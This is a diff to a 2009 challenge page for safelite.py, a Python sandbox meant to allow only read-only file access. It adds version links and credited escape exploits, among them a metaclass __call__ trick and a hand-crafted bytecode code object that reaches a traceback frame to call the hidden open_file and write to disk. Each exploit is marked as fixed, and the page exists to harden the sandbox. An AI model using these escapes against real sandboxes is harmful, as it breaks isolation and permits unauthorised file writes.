@@ -16,7 +16,7 @@ The challenge is simple:
 
 You can find the latest version of safelite.py here:
 
-* http://release.plexnet.org/misc/cappython/safelite.py [VERSION 5]
+* http://release.plexnet.org/misc/cappython/safelite.py [Current: v6]
 
 I will keep safelite.py updated as new exploits and workarounds are found until
 we hopefully end up with a version we can be confident about. [VERSION attribute
@@ -41,7 +41,8 @@ Good luck and thanks! =)
 * `Victor Stinner <http://www.haypocalc.com/wiki/Victor_Stinner>`_ and `Tim
   Wintle
   <http://mail.python.org/pipermail/python-list/2009-February/530536.html>`_
-  found the first exploit: 
+  found the `first exploit
+  <http://mail.python.org/pipermail/python-dev/2009-February/086406.html>`_: 
 
     >>> reload(__builtins__)
     <module '__builtin__' (built-in)> 
@@ -70,14 +71,15 @@ Good luck and thanks! =)
 
   [Fixed in v5]
 
-* `Mike Rooney <http://mrooney.blogspot.com/>`_ started messing with the assumptions of builtins being
-  unaltered:
+* `Mike Rooney <http://mrooney.blogspot.com/>`_ started messing with the
+  assumptions of builtins being unaltered:
 
     >>> __builtins__.str = S
 
   [Fixed in v5]
 
-* Farshid Lashkari then took it to a whole new elegant level:
+* Farshid Lashkari then took it to a whole new `elegant level
+  <http://mail.python.org/pipermail/python-dev/2009-February/086425.html>`_:
 
     >>> _real_file = None
 
@@ -93,3 +95,33 @@ Good luck and thanks! =)
     >>> f = _real_file('foo.txt', 'w')
 
   [Fixed in v5]
+
+* `Guido van Rossum <http://python.org/~guido/>`_ noted that the metaclass
+   was accessible:
+
+    >>> f = FileReader('/etc/passwd')
+    >>> kall = f.__class__.__metaclass__.__call__.im_func
+
+    >>> kall(f.__class__.__metaclass__, [('foo', 47)])
+    <type 'list'>
+
+    >>> f.__class__.__metaclass__.foo
+    47
+
+  [Locked-down in v6 before he could do any real damage ;p]
+
+* `Paul Cannon <http://thepaulprog.blogspot.com/>`_ did the unexpected
+  with his `super hardcore exploit
+  <http://thepaulprog.blogspot.com/2009/02/safelite-exploit.html>`_:
+
+    >>> __builtins__.TypeError = type(lambda: 0)(type(compile('1', 'b', 'eval'))(2, 2, 4, 67, 'y\x08\x00t\x00\x00\x01Wn\x09\x00\x01\x01a\x00\x00n\x01\x00X|\x01\x00|\x00\x00\x83\x01\x00S', (None,), ('stuff',), ('g', 'x'), 'q', 'f', 1, ''), globals(), None, (TypeError,))
+
+    >>> try:
+    ...     FileReader('foo', 2)
+    ... except:
+    ...     pass
+
+    >>> stuff.tb_frame.f_back.f_locals['open_file']('w00t', 'w').write('yaymore\n')
+
+  [Fixed in v6 -- but the principles can still be used. Paul Cannon `explains
+  <http://thepaulprog.blogspot.com/2009/02/safelite-exploit.html>`_.]
